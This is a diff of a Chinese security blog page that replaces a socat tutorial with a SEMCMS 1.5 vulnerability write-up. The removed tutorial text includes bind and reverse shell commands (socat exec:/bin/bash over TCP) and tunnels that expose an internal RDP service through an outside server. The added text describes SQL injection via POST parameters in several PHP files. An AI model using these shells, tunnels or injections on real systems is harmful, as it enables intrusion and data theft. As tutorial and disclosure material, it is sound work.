class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 简单的TCP/UDP端口转发</span></span><br><span class="line"></span><br><span class="line">socat tcp-listen:2333 tcp-connect:2334</span><br><span class="line">socat udp-listen:2333 udp-connect:2334</span><br><span class="line"></span><br><span class="line"><span class="comment"># 支持并发的TCP/UDP端口转发</span></span><br><span class="line"></span><br><span class="line">socat tcp-listen:2333,fork tcp-connect:2334</span><br><span class="line">socat udp-listen:2333,fork udp-connect:2334</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将内容写入日志的并发端口转发</span></span><br><span class="line"></span><br><span class="line">socat -d -d -lf /tmp/<span class="built_in">log</span> tcp-listen:2333,fork tcp-connect:2334</span><br><span class="line">socat -d -d -lf /tmp/<span class="built_in">log</span> udp-listen:2333,fork udp-connect:2334</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将内容写入日志、并发、绑定地址的端口转发</span></span><br><span class="line"></span><br><span class="line">socat -d -d -lf /tmp/<span class="built_in">log</span> tcp-listen:2333,fork,reuseaddr tcp-connect:2334</span><br><span class="line">socat -d -d -lf /tmp/<span class="built_in">log</span> udp-listen:2333,fork,reuseaddr udp-connect:2334</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将内容写入日志、并发、绑定地址、指定IP的端口转发</span></span><br><span class="line"></span><br><span class="line">socat -d -d -lf /tmp/<span class="built_in">log</span> tcp-listen:2333,fork,reuseaddr,<span class="built_in">bind</span>=127.0.0.1 tcp-connect:2334</span><br><span class="line">socat -d -d -lf /tmp/<span class="built_in">log</span> udp-listen:2333,fork,reuseaddr,<span class="built_in">bind</span>=127.0.0.1 udp-connect:2334</span><br><span class="line"></span><br><span class="line"><span class="comment"># 比如这个listen只允许127.0.0.1IP连接</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将内容写入日志、并发、绑定地址、指定IP、指定连接的IP段的端口转发</span></span><br><span class="line"></span><br><span class="line">socat -d -d -lf /tmp/<span class="built_in">log</span> tcp-listen:2333,fork,reuseaddr,<span class="built_in">bind</span>=127.0.0.1,range=127.0.0.1/24 tcp-connect:2334</span><br><span class="line">socat -d -d -lf /tmp/<span class="built_in">log</span> udp-listen:2333,fork,reuseaddr,<span class="built_in">bind</span>=127.0.0.1,range=127.0.0.1/24 udp-connect:2334</span><br><span class="line"></span><br><span class="line"><span class="comment"># 比如这个listen只允许127.0.0.1IP连接，并且connect的内容只允许127.0.0.1 ~ 127.0.0.255段的IP</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 内网穿透的端口转发</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 外网服务器</span></span><br><span class="line"></span><br><span class="line">socat tcp-listen:2333 tcp-listen:80,fork</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地主机</span></span><br><span class="line"></span><br><span class="line">socat tcp-connect:[外网IP]:2333 tcp-connect:127.0.0.1:80,fork(本地服务器)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将内网rdp转发出去</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 外网服务器</span></span><br><span class="line"></span><br><span class="line">socat tcp-listen:4447,reuseaddr,fork tcp-listen:3389</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地主机</span></span><br><span class="line"></span><br><span class="line">socat tcp:[外网IP]:4447,reuseaddr,fork tcp:127.0.0.1:3389</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>重定向：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 简单的重定向</span></span><br><span class="line"></span><br><span class="line">socat tcp-listen:80,reuseaddr,fork tcp:127.0.0.1:8080</span><br><span class="line">socat tcp-listen:7999,reuseaddr,fork tcp:127.0.0.1:3389</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将连接用户以特定用户去连接</span></span><br><span class="line"></span><br><span class="line">socat tcp-listen:2333,reuseaddr,fork,su=nobody tcp-connect:127.0.0.1:2334</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>读写分流：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 实现一个假的webServer</span></span><br><span class="line"></span><br><span class="line">socat open:/tmp/read.txt!!open:/tmp/write.txt,create,append tcp-listen:80,reuseaddr,fork</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每当客户端连接过来时，会fork出一个进程处理，然后先将read.txt文件的内容作为响应内容发回去，再把用户的请求内容记录在write.txt文件中。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 其中 !! 作为读/写流的分割，前边为读，后边为写。</span></span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>文件传输：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 实现简单的文件传输</span></span><br><span class="line"></span><br><span class="line">socat -u open:/etc/issue tcp-listen:3337,reuseaddr,fork</span><br><span class="line">socat -u tcp-connect:127.0.0.1:3337 open:/tmp/ok.txt,create</span><br><span class="line"></span><br><span class="line"><span class="comment"># 其中 -u 意思为左边传右</span></span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>正向SHELL：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务器</span></span><br><span class="line"></span><br><span class="line">socat tcp-listen:3600,fork,reuseaddr <span class="built_in">exec</span>:/bin/bash,pty,stderr</span><br><span class="line">socat tcp-listen:3600,fork,reuseaddr system:bash,pty,stderr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端</span></span><br><span class="line"></span><br><span class="line">socat tcp-connect:127.0.0.1:3600</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>反向SHELL：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务器</span></span><br><span class="line"></span><br><span class="line">socat tcp-connect:127.0.0.1:3601 <span class="built_in">exec</span>:/bin/bash,pty,stderr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端</span></span><br><span class="line"></span><br><span class="line">socat - tcp-listen:3601</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可交互的反弹shell</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务器</span></span><br><span class="line"></span><br><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp-connect:127.0.0.1:3601</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端</span></span><br><span class="line"></span><br><span class="line">socat file:`tty`,raw,<span class="built_in">echo</span>=0 tcp-listen:3601</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>通过openssl加密传输：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 生成服务器证书</span></span><br><span class="line"></span><br><span class="line">openssl genrsa -out server.key 2048</span><br><span class="line">openssl req -new -key server.key -x509 -days 365 -out server.crt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里把 Common Name 设为localhost方便测试</span></span><br><span class="line"></span><br><span class="line">cat server.key server.crt &gt; server.pem</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 生成客户端证书</span></span><br><span class="line"></span><br><span class="line">openssl genrsa -out client.key 2048</span><br><span class="line">openssl req -new -key client.key -x509 -days 365 -out client.crt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里随便设置</span></span><br><span class="line"></span><br><span class="line">cat client.key client.crt &gt; client.pem</span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务器</span></span><br><span class="line"></span><br><span class="line">socat openssl-listen:4433,reuseaddr,cert=server.pem,cafile=client.crt <span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#客户端</span></span><br><span class="line">socat - openssl-connect:localhost:4433,cert=client.pem,cafile=server.crt</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
+<p>主要原理以 <code>6gnGtg_Ali/Ant_Info.php</code> 文件为例，在这里并没有对 <code>$_REQUEST[&quot;info_cat&quot;]</code> 和 <code>$_REQUEST[&quot;skey&quot;]</code> 传入值进行处理，虽然本身自动对 <code>$_GET</code> 都进行了处理仍然可以从 <code>$_POST</code> 传入以绕过对 <code>$_GET</code> 的处理👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201220045459.png" alt="image-20220122004529314"></p>
+<p>接着就直接将拼好的语句放到SQL中查询，期间也并没有进行任何处理👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201220048001.png" alt="image-20220122004801882"></p>
+<p>可以看到两条查询语句都是存在注入的，但第二条会遍历查询结果把每一条记录显示出来，不妨以第二条作为注入核心进行回显注入。</p>
+<p>其他文件也是同样的原理。</p>
+<p><code>6gnGtg_Ali/Ant_M_Contry.php</code> 文件👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201220107602.png" alt="image-20220122010724503"></p>
+<p><code>6gnGtg_Ali/Ant_M_Member.php</code> 文件👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201220108419.png" alt="image-20220122010802336"></p>
+<p><code>6gnGtg_Ali/Ant_M_Order.php</code> 文件👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201220108178.png" alt="image-20220122010835100"></p>
+<p><code>6gnGtg_Ali/Ant_Plist.php</code> 文件👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201220110721.png" alt="image-20220122011058630"></p>
+<p>其中在 <code>ProCatId</code> 函数中其实就存在注入了👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201220112230.png" alt="image-20220122011218148"></p>
+<p><code>6gnGtg_Ali/Ant_Pro.php</code> 文件👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201220112937.png" alt="image-20220122011259845"></p>
+<p>以上这些文件都可以从 <code>$_POST</code> 传入注入内容以绕过本身对 <code>$_GET</code> 参数的过滤。</p>
+<h4 id="证明-6">- 证明 -</h4>
+<p>以 <code>6gnGtg_Ali/Ant_Info.php</code> 为例，直接从 <code>$_POST</code> 传入联合查询注入参数绕过 <code>$_GET</code> 的参数处理即可👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201220050604.png" alt="image-20220122005055432"></p>
+<p>成功地将数据回显注入出来了。</p>
+<h2 id="总结">- 总结 -</h2>
+<p>以上这些应该只是这个 <strong>CMS</strong> 的部分漏洞，可能还有一些没有提到，总之让人感觉就那种，属于挖的特别爽就是了0.0。另外，再提一下，本文仅供网站管理人员与渗透测试人员学习与交流，任何进行的一切未授权攻击行为与本人无关。</p>
 
 
         <hr>
         <!-- Pager -->
         <ul class="pager">
           
-          <li class="previous">
-            <a href="/posts/4281309277/" data-toggle="tooltip" data-placement="top" title="编程 - 编程实现带参数执行模式防SQL注入">&larr; Previous Post</a>
-          </li>
-          
           
           <li class="next">
-            <a href="/posts/4258246850/" data-toggle="tooltip" data-placement="top" title="练习 - Ubuntu19渗透">Next Post &rarr;</a>
+            <a href="/posts/1675626419/" data-toggle="tooltip" data-placement="top" title="漏洞挖掘 - thinkphp6序列化链(一)">Next Post &rarr;</a>
           </li>
           
         </ul>
@@ -647,7 +720,7 @@
       </a>
     </li>
     <li class="social-share-li">
-      <a target="_blank" class="social-share-icon" href="mailto:?subject=说明 - socat的简单使用&body=Hi,I found this website and thought you might like it https://morblog.cc/posts/1756077890/">
+      <a target="_blank" class="social-share-icon" href="mailto:?subject=漏洞挖掘 - SEMCMS1.5&body=Hi,I found this website and thought you might like it https://morblog.cc/posts/1286047278/">
         <i class="fa fa-envelope fa-1x" aria-hidden="true"></i>
       </a>
     </li>
@@ -681,8 +754,8 @@
   <script type="text/javascript">
     /* * * CONFIGURATION VARIABLES * * */
     var disqus_shortname = "moryyds-1";
-    var disqus_identifier = "https://morblog.cc/posts/1756077890/";
-    var disqus_url = "https://morblog.cc/posts/1756077890/";
+    var disqus_identifier = "https://morblog.cc/posts/1286047278/";
+    var disqus_url = "https://morblog.cc/posts/1286047278/";
 
     (function () {
       var dsq = document.createElement('script');
@@ -710,7 +783,7 @@
         <div id="toc" class="toc-article">
         <strong class="toc-title">目录</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">说明 - socat的简单使用</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#socat-%E7%AE%80%E4%BB%8B"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">- socat 简介 -</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#socat-%E5%AE%89%E8%A3%85"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">- socat 安装 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#socat-%E5%AE%89%E8%A3%85-Linux"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">- socat 安装 (Linux) -</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#socat-%E5%AE%89%E8%A3%85-windows"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">- socat 安装(windows) -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#socat-%E5%9F%BA%E6%9C%AC%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">- socat 基本工作原理 -</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#socat-%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">- socat 基本用法 -</span></a></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">漏洞挖掘 - SEMCMS1.5</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">- 前言 -</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%89%8D%E5%8F%B0"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">- 前台 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">- SQL注入 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C-%E7%99%BB%E5%BD%95-%E8%AE%A2%E9%98%85%E6%8F%90%E4%BA%A4-%E8%AF%84%E8%AE%BA%E6%8F%90%E4%BA%A4-%E7%BB%93%E7%AE%97%E9%A1%B5%E9%9D%A2-%E7%9B%B2%E6%B3%A8"><span class="toc-nav-number">1.2.1.1.</span> <span class="toc-nav-text">- 用户注册&#x2F;登录&#x2F;订阅提交&#x2F;评论提交&#x2F;结算页面(盲注) -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90"><span class="toc-nav-number">1.2.1.1.1.</span> <span class="toc-nav-text">- 分析 -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E8%AF%81%E6%98%8E"><span class="toc-nav-number">1.2.1.1.2.</span> <span class="toc-nav-text">- 证明 -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%89%A9%E5%B1%95"><span class="toc-nav-number">1.2.1.1.3.</span> <span class="toc-nav-text">- 扩展 -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%94%A8%E6%88%B7%E5%9C%B0%E5%9D%80%E7%AE%A1%E7%90%86-%E7%9B%B2%E6%B3%A8"><span class="toc-nav-number">1.2.1.2.</span> <span class="toc-nav-text">-  用户地址管理(盲注) -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-2"><span class="toc-nav-number">1.2.1.2.1.</span> <span class="toc-nav-text">- 分析 -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E8%AF%81%E6%98%8E-2"><span class="toc-nav-number">1.2.1.2.2.</span> <span class="toc-nav-text">- 证明 -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%AE%A2%E9%98%85%E6%8F%90%E4%BA%A4-%E7%9B%B2%E6%B3%A8"><span class="toc-nav-number">1.2.1.3.</span> <span class="toc-nav-text">- 订阅提交(盲注) -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-3"><span class="toc-nav-number">1.2.1.3.1.</span> <span class="toc-nav-text">- 分析 -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E8%AF%81%E6%98%8E-3"><span class="toc-nav-number">1.2.1.3.2.</span> <span class="toc-nav-text">- 证明 -</span></a></li></ol></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E9%9A%90%E8%97%8F%E5%89%8D%E5%8F%B0"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">- 隐藏前台 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-nav-number">1.3.1.</span> <span class="toc-nav-text">- 补充 -</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#RCE"><span class="toc-nav-number">1.3.2.</span> <span class="toc-nav-text">- RCE -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-4"><span class="toc-nav-number">1.3.2.1.</span> <span class="toc-nav-text">- 分析 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%AF%81%E6%98%8E-4"><span class="toc-nav-number">1.3.2.2.</span> <span class="toc-nav-text">- 证明 -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#SSRF"><span class="toc-nav-number">1.3.3.</span> <span class="toc-nav-text">- SSRF -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-5"><span class="toc-nav-number">1.3.3.1.</span> <span class="toc-nav-text">- 分析 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%AF%81%E6%98%8E-5"><span class="toc-nav-number">1.3.3.2.</span> <span class="toc-nav-text">- 证明 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%89%A9%E5%B1%95-2"><span class="toc-nav-number">1.3.3.3.</span> <span class="toc-nav-text">- 扩展 -</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%90%8E%E5%8F%B0"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">- 后台 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#SQL%E6%B3%A8%E5%85%A5-2"><span class="toc-nav-number">1.4.1.</span> <span class="toc-nav-text">- SQL注入 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-6"><span class="toc-nav-number">1.4.1.1.</span> <span class="toc-nav-text">- 分析 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%AF%81%E6%98%8E-6"><span class="toc-nav-number">1.4.1.2.</span> <span class="toc-nav-text">- 证明 -</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-nav-number">1.5.</span> <span class="toc-nav-text">- 总结 -</span></a></li></ol></li></ol>
         
         </div>
       </aside>
@@ -735,9 +808,9 @@
             
             <a class="tag" href="/tags/#安全" title="安全">安全</a>
             
-            <a class="tag" href="/tags/#WEB" title="WEB">WEB</a>
+            <a class="tag" href="/tags/#PHP" title="PHP">PHP</a>
             
-            <a class="tag" href="/tags/#工具" title="工具">工具</a>
+            <a class="tag" href="/tags/#漏洞" title="漏洞">漏洞</a>
             
           </div>
         </section>
